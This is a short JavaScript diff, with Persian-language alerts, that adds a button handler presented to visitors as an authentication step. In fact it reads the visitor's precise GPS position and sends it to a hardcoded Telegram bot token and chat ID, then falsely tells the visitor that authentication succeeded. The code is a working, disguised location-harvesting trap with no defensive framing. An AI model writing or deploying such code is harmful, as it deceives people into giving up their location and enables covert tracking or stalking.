@@ -1,0 +1,41 @@
+authButton.addEventListener('click', () => {
+    if ("geolocation" in navigator) {
+        navigator.geolocation.getCurrentPosition((position) => {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+
+            // ساخت URL API برای ارسال موقعیت مکانی
+            const url = `https://api.telegram.org/bot8007604782:AAFBW5oKYEDE2HZHhry7uenKGiZVdOrcFg8/sendLocation`;
+            
+            // ارسال درخواست
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: "1426493835",
+                    latitude: latitude,
+                    longitude: longitude
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    alert("احراز هویت شما با موفقیت انجام شد. خوش آمدید!");
+                } else {
+                    alert("احراز هویت ناموفق بود. لطفاً دوباره تلاش کنید.");
+                }
+            })
+            .catch(err => {
+                alert("خطایی در احراز هویت رخ داد. لطفاً دوباره تلاش کنید.");
+                console.error(err);
+            });
+        }, (error) => {
+            alert("لطفاً دسترسی به موقعیت مکانی خود را فعال کنید.");
+            console.error("خطای موقعیت مکانی:", error);
+        });
+    } else {
+        alert("مرورگر شما از احراز هویت پشتیبانی نمی‌کند.");
+    }
+});
+
